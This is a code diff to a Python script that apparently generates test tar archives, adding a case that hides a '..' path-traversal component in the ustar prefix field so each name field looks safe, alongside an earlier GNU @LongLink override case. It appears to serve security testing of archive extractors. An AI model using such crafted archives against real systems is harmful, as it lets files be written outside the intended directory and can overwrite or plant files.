@@ -13,6 +13,7 @@ Cells:
   iv   candidate -- GNU '@LongLink' (L) override, >100 byte name so the ustar field truncates.
 """
 import io, sys, tarfile, time
+from ustar import hdr, pad
 
 NONCE = sys.argv[2] if len(sys.argv) > 2 else "n0"
 cell = sys.argv[1]
@@ -56,6 +57,16 @@ elif cell == "iv":
     with tarfile.open(out, "w", format=tarfile.GNU_FORMAT) as tf:
         reg(tf, "./index.html", INDEX)
         reg(tf, longname, ESCAPE)
+
+elif cell == "v":
+    # POSIX ustar name splitting: full name = prefix + "/" + name.
+    # Every 100-byte `name` field stays "./"-prefixed and ".."-free; the
+    # traversal lives in the 155-byte `prefix` field at offset 345.
+    blob = hdr(b"./index.html", len(INDEX)) + pad(INDEX)
+    blob += hdr(("./prefix-escape-%s.html" % NONCE).encode(), len(ESCAPE),
+                prefix=b"..") + pad(ESCAPE)
+    blob += b"\0" * 1024
+    open(out, "wb").write(blob)
 
 else:
     raise SystemExit("unknown cell %r" % cell)
